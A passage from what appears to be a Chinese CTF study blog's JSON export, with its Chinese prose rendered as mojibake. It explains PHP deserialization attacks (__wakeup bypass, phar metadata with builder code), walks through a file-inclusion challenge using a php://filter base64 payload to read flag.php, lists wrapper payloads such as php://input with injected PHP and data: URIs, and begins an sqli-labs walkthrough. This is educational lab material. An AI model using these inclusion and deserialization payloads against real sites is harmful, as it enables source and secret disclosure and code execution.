å°†Nameåçš„2æ”¹ä¸º3ï¼ˆå¤§ä¸€ç‚¹ä¹Ÿè¡Œï¼‰ï¼Œå†è¾“å…¥è¿›selectä¸­è·å–flagï¼š è§£æ¯• åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åºåˆ—åŒ–æ˜¯å°†å˜é‡æˆ–å¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œè€Œååºåˆ—åŒ–æ˜¯å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºå˜é‡æˆ–å¯¹è±¡çš„è¿‡ç¨‹ï¼Œåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ä¸»è¦æ˜¯ä¸ºäº†æ–¹ä¾¿å¯¹è±¡çš„ä¼ è¾“ã€‚ä¸€èˆ¬åœ¨phpä¸­å¸¸ç”¨çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ–¹å¼æœ‰ï¼šserializeï¼Œunserializeï¼›json_encodeï¼Œjson_decodeä¸€èˆ¬åœ¨ctfä¸­å‰è€…çš„ä½¿ç”¨æ›´å¤šã€‚ è¿™é‡Œä»‹ç»phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–åŸºæœ¬ç±»å‹è¡¨è¾¾ï¼š å¸ƒå°”å‹ï¼šb:value =&gt; b:0 æ•´æ•°å‹ï¼ši:value =&gt; i:1 å­—ç¬¦ä¸²å‹ï¼šs:length:value =&gt;s:4 â€œaaaaâ€ æ•°ç»„å‹ï¼ša::{key, value pairs} =&gt;a:1:{i:1;s:1 â€œaâ€} å¯¹è±¡å‹ï¼šO: NULLå‹ï¼šN ä¸‹é¢è¿™ç¯‡åšå®¢ä¸­è¯¦ç»†å‰–æäº†PHPåºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œæƒ³è¦è¯¦ç»†å­¦ä¹ å¯ä»¥å‚è€ƒï¼Œæœ¬ç¯‡åšå®¢ä¸åšè¯¦ç»†çš„ä»‹ç»ã€‚æ·±åº¦å‰–æPHPåºåˆ—åŒ–å’Œååºåˆ—åŒ– ååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ï¼ˆéšæ—¶æ›´æ–°ï¼‰åˆ©ç”¨è¿™ä¸ªæ¼æ´æœ‰ä¸¤ä¸ªæ¡ä»¶ï¼š unserialize()å‡½æ•°çš„å‚æ•°æ˜¯å¯æ§çš„ phpä¸­æœ‰å¯åˆ©ç”¨çš„ç±»å¹¶ä¸”ç±»ä¸­å«æœ‰é­”æœ¯æ–¹æ³• é­”æœ¯æ–¹æ³•ä¸­å­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œçš„eval ç„¶åå†ä»‹ç»ä¸€æ‰¹é­”æœ¯æ–¹æ³•ï¼š 1234567__construct()ï¼šåˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–__destruct()ï¼šç»“æŸæ—¶é”€æ¯å¯¹è±¡__toString()ï¼šå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²æ—¶ä½¿ç”¨__sleep()ï¼šåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰è°ƒç”¨__wakeup()ï¼šååºåˆ—åŒ–ä¹‹å‰è°ƒç”¨__call()ï¼šè°ƒç”¨å¯¹è±¡ä¸å­˜åœ¨æ—¶ä½¿ç”¨__get()ï¼šè°ƒç”¨ç§æœ‰å±æ€§æ—¶ä½¿ç”¨ ç”±æ­¤æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå½“ä¼ ç»™ååºåˆ—åŒ–å‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ä»è€Œæ§åˆ¶å¯¹è±¡å†…éƒ¨çš„å˜é‡ç”šè‡³å‡½æ•°ã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥è¯¦ç»†ä»‹ç»å‡ ä¸ªå¸¸è§çš„ååºåˆ—åŒ–æ¼æ´çš„åº”ç”¨ã€‚ CVE-2016-7124ï¼ˆ_wakeup()ç»•è¿‡ï¼‰å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„ä¾‹é¢˜ä¸­æˆ‘ä»¬ä½¿ç”¨çš„ç»•è¿‡æ–¹æ³•ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚ pharååºåˆ—åŒ–pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½è¢«å‚¨å­˜åœ¨pharæ–‡ä»¶å†…å®¹æè¿°ç€éƒ¨åˆ†ä¸­ã€‚è€Œè¿™ä¸ªéƒ¨åˆ†è¿˜ä¼šä»¥åºåˆ—åŒ–å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯æ”»å‡»çš„æ ¸å¿ƒéƒ¨åˆ†ã€‚ pharå½’æ¡£æ–‡ä»¶æœ‰ä¸‰ç§æ ¼å¼ï¼štarå½’æ¡£ã€zipå½’æ¡£å’Œpharå½’æ¡£ã€‚pharæ ¼å¼çš„æ–‡ä»¶å…è®¸æˆ‘ä»¬å®Œå…¨æ§åˆ¶æ–‡ä»¶çš„èµ·å§‹éƒ¨åˆ†ï¼Œè€Œæœ€å°çš„æ ‡å¿—ï¼ˆstubï¼‰å¯ä»¥ä½œä¸ºä»»æ„æ•°æ®çš„å‰ç¼€ï¼Œä¹Ÿæ˜¯pharæ–‡ä»¶ä¸­çš„ç¬¬ä¸€é¡¹ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ä¼ªé€ æ–‡ä»¶å¤´æ¥ç»•è¿‡å¯¹æ–‡ä»¶æ ¼å¼çš„æ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªæ—¢æ˜¯åˆæ³•jpegæ–‡ä»¶åˆæ˜¯ä¸€ä¸ªåˆæ³•çš„pharæ–‡ä»¶ã€‚ è¦ç”Ÿæˆpharæ–‡ä»¶ï¼Œæˆ‘ä»¬é¦–å…ˆè¦ä¿®æ”¹php.iniä¸­phar.readonlyçš„é€‰é¡¹ï¼Œåˆ å»å‰é¢çš„åˆ†å·ï¼Œå¹¶å°†Onæ”¹ä¸ºOffã€‚æ¥ç€æˆ‘ä»¬ç”Ÿæˆpharæ–‡ä»¶ï¼š 12345678910111213&lt;?php class Test&#123; &#125; @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //åç¼€ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®Stub $o = new Test(); $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ $phar-&gt;stopBuffering();?&gt; ç”¨010æ‰“å¼€æ–‡ä»¶å°±ä¼šå‘ç°åºåˆ—åŒ–å¯¹è±¡å·²è¢«å­˜å…¥äº†pharæ–‡ä»¶å½“ä¸­ã€‚ è€Œpharçš„æ”»å‡»é¢æ˜¯å¾ˆå¹¿æ³›çš„ï¼Œphpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œä»¥ä¸‹å‡½æ•°éƒ½å—åˆ°äº†å½±å“ï¼š é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç¼–å†™ç¨‹åºè¿›è¡Œååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»äº†ï¼š 123456789&lt;?phpclass Test&#123; public function __destruct()&#123; echo &quot;i&#x27;m ok&quot;; &#125;&#125;$file = &#x27;phar://phar.phar/test.txt&#x27;;file_get_contents($file);?&gt; æœ€åæˆ‘ä»¬å‘ç°è§¦å‘æˆåŠŸã€‚ others wait to updateç”±äºæŸ¥é˜…äº†å…¶ä»–äººå†™çš„åšå®¢å‘ç°è¿™é‡Œé¢çš„æ°´å¾ˆæ·±ï¼Œå› æ­¤åœ¨ä»¥åæ¯ç¢°åˆ°ä¸€ç§æ–°çš„æ–¹å¼éƒ½ä¼šåœ¨è¿™å‰é¢è¿›è¡Œæ›´æ–°ã€‚ æ€»ç»“åˆ·buuå‘ç°è¿˜æœ‰å¾ˆå¤šçš„æ–°çŸ¥è¯†ç­‰å¾…æŒæ¡ï¼Œåˆ·é¢˜è¿˜æ˜¯å¾ˆæœ‰æ•ˆæœçš„ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"phpæ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨","slug":"phpæ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨","date":"2021-10-30T03:15:42.000Z","updated":"2021-11-24T06:37:05.482Z","comments":true,"path":"2021/10/30/phpæ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨/","link":"","permalink":"http://example.com/2021/10/30/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","excerpt":"å‰è¨€ä¸Šæ¬¡æ ¡èµ›çš„web3ä»¥åŠåœ¨åšbuuæ—¶éƒ½é‡åˆ°äº†æ–‡ä»¶åŒ…å«çš„é—®é¢˜ï¼Œå°±å¼€ç¯‡åšå®¢å­¦ä¹ è®°å½•phpæ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ã€‚","text":"å‰è¨€ä¸Šæ¬¡æ ¡èµ›çš„web3ä»¥åŠåœ¨åšbuuæ—¶éƒ½é‡åˆ°äº†æ–‡ä»¶åŒ…å«çš„é—®é¢˜ï¼Œå°±å¼€ç¯‡åšå®¢å­¦ä¹ è®°å½•phpæ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ã€‚ å¼•å­[ACTF2020æ–°ç”Ÿèµ›]includeè¿™é¢˜åªæ˜¯ä¸€ä¸ªå•çº¯çš„æ–‡ä»¶åŒ…å«æ²¡ä»€ä¹ˆæ„æ€ï¼Œæˆ‘å°±ä»[æå®¢å¤§æŒ‘æˆ˜]secret fileè¿™é¢˜è®²èµ· è¿›å…¥ç½‘é¡µï¼Œä¼¼ä¹ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ä¹Ÿæ²¡æœ‰ï¼Œç›´æ¥F12ç”¨æŸ¥çœ‹å™¨æŸ¥çœ‹HTMLï¼Œå‘ç°äº†è¿™ä¹ˆä¸€è¡Œï¼š 1&lt;a id=&quot;master&quot; href=&quot;./Archive_room.php&quot; style=&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;/a&gt; è¿™ä¸ªé¡µé¢ä¸­æœ‰ä¸€ä¸ªåœ°æ–¹éšè—ç€ä¸€ä¸ªOh! You found meï¼Œç‚¹å‡»åä¼šè·³è½¬åˆ°Archive_room.phpä¸­ï¼Œä½†æ˜¯ç”±äºé¢œè‰²ä¸èƒŒæ™¯è‰²è®¾ç½®ä¸€è‡´å¯¼è‡´æˆ‘ä»¬æ²¡æ³•ç›´æ¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥å·¦é”®é¼ æ ‡æ‹–åŠ¨ä½¿å…¶æ˜¾æ€§ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡URLè¿›å…¥ä¸‹ä¸€ä¸ªphpæ–‡ä»¶ä¸­ã€‚ è¿›å…¥ä¸‹ä¸€ä¸ªé¡µé¢ï¼Œè¿™æ¬¡è¿™ä¸ªç§˜å¯†ä¼¼ä¹ç›´æ¥è´´åœ¨äº†æˆ‘ä»¬çš„è„¸ä¸Šï¼Œä½†æ˜¯å½“æˆ‘ä»¬ç‚¹å‡»è¿›secretåï¼Œå¾ˆå¿«å•Šå‘Šè¯‰æˆ‘ä»¬æŸ¥é˜…ç»“æŸï¼Œæˆ‘ä»¬F12æŸ¥çœ‹åå‘ç°æ•´ä¸ªè¿‡ç¨‹åº”è¯¥æ˜¯å…ˆè¿›å…¥äº†action.phpï¼Œç„¶åå†å¾ˆå¿«åœ°è·³è½¬åˆ°äº†end.phpä¸­ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¼°è®¡å…³é”®å°±è—åœ¨äº†action.phpä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯¹ç½‘é¡µè¿›è¡ŒæŠ“åŒ…ï¼š æœç„¶ï¼Œsecr3t.phpå°±è—åœ¨äº†action.phpä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥ï¼Œé¡µé¢ä¸­å‡ºç°çš„æ˜¯ä¸€ä¸²ä»£ç ï¼š 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET[&#x27;file&#x27;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flagæ”¾åœ¨äº†flag.phpé‡Œ?&gt;&lt;/html&gt; ç›¸å½“ç»å…¸çš„ä¸€ä¸²æ–‡ä»¶åŒ…å«ä»£ç ï¼Œè¿™é‡Œç”¨åˆ°æ–‡ä»¶åŒ…å«ä¸­çš„php://filterï¼Œç„¶åæˆ‘ä»¬è¯»å–æ–‡ä»¶ä¸­çš„ä»£ç ï¼Œåªéœ€è¦è¿›è¡Œbase64ç¼–ç ï¼Œè¿™æ ·æ–‡ä»¶å°±ä¸ä¼šè¢«æ‰§è¡Œï¼Œè€Œæ˜¯é€šè¿‡base64çš„æ–¹å¼è¿”å›ï¼Œå› ä¸ºè¢«base64ç¼–ç åå†ä¼ å…¥includeå‡½æ•°ï¼Œå°±ä¸ä¼šè¢«è®¤ä¸ºæ˜¯phpæ–‡ä»¶ï¼Œé‚£ä¹ˆæ–‡ä»¶å°±ä¸ä¼šæ‰§è¡Œï¼Œè€Œæ˜¯è¾“å‡ºæ–‡ä»¶çš„base64ç¼–ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†è¿›è¡Œè§£ç å³å¯ã€‚?file=php://filter/read=convert.base64-encode/resource=flag.php åœ¨F12ä¸­è·å–base64ç ï¼š 1PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MDM4NzE4NTktNjVlYi00Y2ZjLTk1ZjktMDZlMmI0MTliMDI2fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= æœ€åè§£ç ï¼š 1234567891011121314151617181920212223&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;FLAG&lt;/title&gt; &lt;/head&gt; &lt;body style=&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;h1 style=&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;å•Šå“ˆï¼ä½ æ‰¾åˆ°æˆ‘äº†ï¼å¯æ˜¯ä½ çœ‹ä¸åˆ°æˆ‘QAQ~~~&lt;/h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p style=&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt; &lt;?php echo &quot;æˆ‘å°±åœ¨è¿™é‡Œ&quot;; $flag = &#x27;flag&#123;03871859-65eb-4cfc-95f9-06e2b419b026&#125;&#x27;; $secret = &#x27;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#x27; ?&gt; &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; è§£æ¯• phpæ–‡ä»¶åŒ…å«æ¼æ´åˆ©ç”¨çœ‹å®Œäº†ä¸Šé¢çš„ä¾‹é¢˜ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å¤§ä½“äº†è§£åˆ°æ–‡ä»¶åŒ…å«çš„ä¸€äº›çœ‰ç›®äº†ã€‚æˆ‘ä»¬è¦çŸ¥é“ï¼Œinclude()å‡½æ•°å¯¹æ–‡ä»¶åç¼€åæ— è¦æ±‚ï¼Œè€Œå¯¹å…¶ä¸­çš„è¯­æ³•æœ‰è¦æ±‚ã€‚å› æ­¤æ— è®ºæ–‡ä»¶æ ¼å¼æ˜¯txtï¼Œphpè¿˜æ˜¯jpgç­‰ï¼Œåªè¦å†…å®¹ç¬¦åˆçš„æ ¼å¼å°±å¯ä»¥æ‰§è¡Œã€‚æ¥ä¸‹æ¥è¯¦ç»†ä»‹ç»å„ç§ç±»å‹çš„æ–‡ä»¶åŒ…å«æ¼æ´çš„åº”ç”¨ã€‚ php://filterphp://filterå¯ä»¥ä½œä¸ºä¸€ä¸ªä¸­é—´æµæ¥å¤„ç†å…¶ä»–æµï¼Œå¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶çš„è¯»å–ï¼Œè¿™ä¸ªåè®®å¯ä»¥ç”¨æ¥è¿‡æ»¤ä¸€äº›ä¸œè¥¿ã€‚æˆ‘ä»¬å¯ä»¥è®¾ç½®å‚æ•°ï¼š resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;ï¼šæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚ read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;ï¼šå¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚ write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;ï¼šå¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš” &lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;ï¼šä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚ åœ¨æ ¡èµ›ä¸­ç”¨çš„æ˜¯rot13ç¼–ç ï¼Œå¦‚æœä½¿ç”¨rot-13ï¼Œåˆ™è¯¥æ–¹æ³•ä»…é™äºå½“short_open_tagä¸å¼€å¯çš„æ—¶å€™ï¼Œè€Œä¸”resourceçš„æ•°æ®æµä¹Ÿæ²¡æœ‰ç›´æ¥ç»™ï¼Œä¸è¿‡åœ¨ctfæ¯”èµ›ä¸­ä¸€èˆ¬çš„æ•°æ®æµéƒ½æ˜¯flagæˆ–è€…å…³äºflagçš„å˜ç§å½¢å¼ã€‚è€Œè¿™ç§å½¢å¼çš„æ–‡ä»¶åŒ…å«ä¹Ÿæ˜¯ç›®å‰æˆ‘ä»¬èƒ½è§åˆ°æœ€å¤šçš„ã€‚ æ€»ä¹‹ï¼Œphp://filteråè®®æœ‰ä¸€ä¸‹å‡ ä¸ªåº”ç”¨ï¼š åˆ©ç”¨base64è·å¾—æºç  é€šè¿‡è¯»å†™ç¼–ç å®è¡Œç»•è¿‡æ“ä½œ php://inputphp://inputçš„ä½¿ç”¨åªéœ€è¦php://input æ˜¯ä¸ªå¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµã€‚POST è¯·æ±‚çš„æƒ…å†µä¸‹ï¼Œæœ€å¥½ä½¿ç”¨ php://input æ¥ä»£æ›¿ $HTTP_RAW_POST_DATAï¼Œå› ä¸ºå®ƒä¸ä¾èµ–äºç‰¹å®šçš„ php.ini æŒ‡ä»¤ã€‚å°†è¦æ‰§è¡Œçš„è¯­æ³•phpä»£ç å†™åœ¨postä¸­æäº¤ï¼Œä¸ç”¨é”®ä¸å€¼çš„å½¢å¼ï¼Œåªå†™ä»£ç å³å¯ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªä»£ç æŸ¥çœ‹phpinfoç­‰æ›´é‡è¦çš„é¡µé¢ï¼Œåªéœ€è¦æˆ‘ä»¬POSTä¸€ä¸ªå®Œæ•´çš„phpè¯­å¥å°±è¡Œäº†ï¼š 12?page=php://inputPOST:&lt;?php phpinfo(); ?&gt; å…³äºphp://ç±»å‹çš„åè®®åœ¨phpæ‰‹å†Œä¸­æœ‰æ›´è¯¦ç»†çš„ä»‹ç»ï¼šphp://inputè¯¦è§£- Manual file://ç®€å•æ¥è¯´å’Œphp://filterç±»ä¼¼ï¼Œä½†æ˜¯è®¿é—®æœ¬åœ°æ–‡ä»¶æ—¶åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„æ¥è¯»å–ï¼Œå› æ­¤åœ¨åšé¢˜æ—¶åŸºæœ¬æ˜¯å®Œå…¨ç”¨ä¸ä¸Šçš„ç±»å‹ã€‚ phar:// &amp; zip://è¿™ä¸¤è€…éƒ½æ˜¯ç”¨æ¥æŸ¥æ‰¾æŒ‡å®šå‹ç¼©åŒ…å†…çš„æ–‡ä»¶ï¼ŒåŒºåˆ«å°±åœ¨äºå‰è€…å¯ä»¥ä¼ å…¥ç»å¯¹è·¯å¾„ä¸ç›¸å¯¹è·¯å¾„ï¼Œè€Œåè€…åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„ï¼Œä¸”åœ¨ä½¿ç”¨åè€…æ—¶è¦ç”¨#åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸”#è¦ç”¨urlç¼–ç %23ã€‚ data:ä¹Ÿæ˜¯å¯ä»¥ç›´æ¥ä¼ å…¥ä»£ç ï¼Œæ ¼å¼ä¸ºï¼šdata: text/plain,&lt;?php payload ?&gt; å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨base64ç¼–ç ï¼šdata:text/plain;base64,payloadï¼ˆç¼–ç è¿‡çš„ï¼‰è¿˜è¦è®°å¾—base64ç¼–ç åçš„=ä¸+è¦æ‰‹åŠ¨è¿›è¡ŒURLç¼–ç ã€‚ http://includeä¹Ÿå¯ä»¥ä¼ å…¥å¤–éƒ¨é“¾æ¥ï¼Œè¿™ä¸ªå¯ä»¥æ ‡è®°ä»¥ä¸‹ï¼Œè¯´ä¸å®šä»¥åæœ‰å¤§ç”¨ã€‚ æ€»ç»“æ–‡ä»¶åŒ…å«æ¼æ´çš„åº”ç”¨æ˜¯ç›®å‰æˆ‘ä»¬é‡åˆ°é¢˜ç›®ä¸­çš„å¸¸ç”¨è§£æ³•ä¹‹ä¸€ï¼Œå½“ç„¶è¿˜æœ‰å…¶ä»–ä¾‹å¦‚å †å æ³¨å…¥ç­‰ç­‰éƒ½å€¼å¾—æˆ‘ä»¬å»æ¢ç´¢å­¦ä¹ ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"sqli-labsç»ƒä¹ -less-29-37","slug":"sqli-labsç»ƒä¹ -less-29-37","date":"2021-10-28T12:47:12.000Z","updated":"2021-11-19T14:52:14.318Z","comments":true,"path":"2021/10/28/sqli-labsç»ƒä¹ -less-29-37/","link":"","permalink":"http://example.com/2021/10/28/sqli-labs%E7%BB%83%E4%B9%A0-less-29-37/","excerpt":"å‰è¨€è¿™å‡ å…³ä¸»è¦ç»ƒä¹ wafä¸å•å¼•å·è¿‡æ»¤çš„ç»•è¿‡ï¼Œå…¶ä¸­29-31å…³éœ€è¦é…ç½®å¥½tomcatå¹¶å¼€å¯æœåŠ¡ï¼Œæ¥ä¸‹æ¥å¼€å§‹è§£é¢˜ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚","text":"å‰è¨€è¿™å‡ å…³ä¸»è¦ç»ƒä¹ wafä¸å•å¼•å·è¿‡æ»¤çš„ç»•è¿‡ï¼Œå…¶ä¸­29-31å…³éœ€è¦é…ç½®å¥½tomcatå¹¶å¼€å¯æœåŠ¡ï¼Œæ¥ä¸‹æ¥å¼€å§‹è§£é¢˜ps.æ•´ç†äº†å…³äºsqli-labsé¶åœºçš„åšå®¢ï¼Œå°†åˆ†æ•£çš„å‡ ç¯‡æ•´åˆäº†èµ·æ¥ã€‚ less29-31ä¸‰å…³ä¸€èµ·å†™ï¼Œå› ä¸ºé™¤äº†å­—ç¬¦å‹æ³¨å…¥ç±»å‹ä¸åŒï¼Œå…¶ä»–æ–¹é¢å‡ ä¹éƒ½æ˜¯ä¸€è‡´çš„ã€‚æˆ‘ä»¬å…ˆçœ‹æºä»£ç ï¼š 12$qs = $_SERVER[&#x27;QUERY_STRING&#x27;];$hint=$qs; æºç ä¸­å‡ºç°äº†$_SERVERå‡½æ•°ï¼Œå…³äºè¿™ä¸ªå‡½æ•°çš„å…·ä½“ç”¨æ³•å¯ä»¥å‚è€ƒæœ¬æ®µæœ€åçš„é“¾æ¥ã€‚ä¸­æ‹¬å·ä¸­çš„å…ƒç´ ä¸ºâ€™QUERY_STRINGâ€™ï¼Œæ„æ€æ˜¯æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰çš„è¯é€šè¿‡å®ƒè¿›è¡Œé¡µé¢è®¿é—®ã€‚è€Œæˆ‘ä»¬å‘ç°è¿™å…³è¿˜æœ‰ä¸€ä¸ªlogin.phpæ–‡ä»¶ï¼Œè¿™å°±æ„å‘³ç€è¿™å…³å…¶å®æ˜¯ä¸¤ä¸ªæœåŠ¡å™¨åœ¨è¿›è¡Œä½œç”¨ã€‚PHPæ‰‹å†Œï¼š$_SERVERå‡½æ•° é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹çœ‹login.phpï¼š 123456789101112131415161718192021222324252627282930313233function whitelist($input)&#123; $match = preg_match(&quot;/^\\d+$/&quot;, $input); if($match) &#123; //echo &quot;you are good&quot;; //return $match; &#125; else &#123; header(&#x27;Location: hacked.php&#x27;); //echo &quot;you are bad&quot;; &#125;&#125;function java_implimentation($query_string)&#123; $q_s = $query_string; $qs_array= explode(&quot;&amp;&quot;,$q_s); foreach($qs_array as $key =&gt; $value) &#123; $val=substr($value,0,2); if($val==&quot;id&quot;) &#123; $id_value=substr($value,3,30); return $id_value; echo &quot;&lt;br&gt;&quot;; break; &#125; &#125;&#125; è¿™ä¸¤ä¸ªè‡ªå®šä¹‰å‡½æ•°å¯ä»¥è¯´æ˜¯è¿™ä¸ªphpæ–‡ä»¶ä¸­çš„é‡ä¸­ä¹‹é‡ï¼Œå…ˆä»‹ç»ä¸‹å…¶ä¸­çš„explode()ä¸foreach()ã€‚ explode()æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ï¼Œä¾‹å¦‚$str=â€Hello Worldâ€åœ¨explode(â€œ â€œ;$str)å‡½æ•°ä½œç”¨ä¸‹å°±è¢«æ‰“æ•£æˆäº†Array([0] =&gt; Hello [1] =&gt; World) 